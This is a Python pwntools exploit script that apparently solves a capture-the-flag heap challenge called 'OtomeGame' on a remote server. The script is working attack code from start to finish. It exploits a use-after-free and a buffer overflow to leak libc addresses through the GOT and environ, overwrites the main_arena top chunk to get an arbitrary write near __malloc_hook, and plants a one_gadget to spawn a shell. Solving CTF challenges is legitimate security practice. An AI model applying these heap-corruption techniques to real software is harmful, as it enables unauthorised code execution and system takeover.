#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './OtomeGame'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '13.229.87.49', 17878

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401b53
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def play(write_addr, payload, leak_addr):
    io.sendlineafter(b':', write_addr)  # UAF  

    # Stage 1
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', b'y')    # malloc(0x80); free(0x80);
    io.sendlineafter(b':', payload)

    # Stage 2
    leak_payload = b'A' * 16 + p64(leak_addr)
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', leak_payload) # interesting buffer overflow -> off 16
    io.sendlineafter(b':', b'3')

    io.recvuntil(b'menghabiskan ')
    leak = int(io.recvuntil(b' ', drop=True))

    # # Stage 3
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', b'3')    # free(0x10);  

    # continue loop
    io.sendlineafter(b':', b'y')

    return leak

def exploit():
    global io
    io = initialize()

    # init, doesn't matter
    # malloc(0x10); malloc(0x20); malloc(0x100);
    io.sendlineafter(b'Name :', b'Garbo')

    # arbitrary read
    _puts = play(b'AAAA', b'BBBB', elf.got['puts'])
    libc.address = _puts - libc.sym['puts']
    assert libc.address & 0xfff == 0

    # one more round to set UAF chunk + 8 to main_arena
    _environ = play(b'CCCC', b'DDDD', libc.sym['environ'])
    _rip = _environ - 0xf0

    __malloc_hook = libc.address + 0x3c4b10 # objdump -T libc.so.6 | grep __malloc_hook
    __free_hook = libc.address + 0x3c67a8   # objdump -T libc.so.6 | grep __free_hook
    one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

    # overwriting Main Arena Top Chunk to gain arbitrary write
    payload = p64(__malloc_hook - 0x10) + p64(0x0)  # 0x10 just some alignment issues, found by just trial & error
    for i in range(15):
        payload += p64(libc.sym['main_arena'] + 88 + 16 * i) * 2 # overwriting the rest Main Arena structure with default values 
    assert len(payload) == 0x100 # read() buffer size

    io.sendafter(b':', payload) 
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', b'y')    
    io.sendafter(b':', p64(libc.address + one_gadgets[2]))

    info('libc base: %#x', libc.address)
    info('leaked puts: %#x', _puts)
    info('leaked environ: %#x', _environ)
    info('leaked rip at stack: %#x', _rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
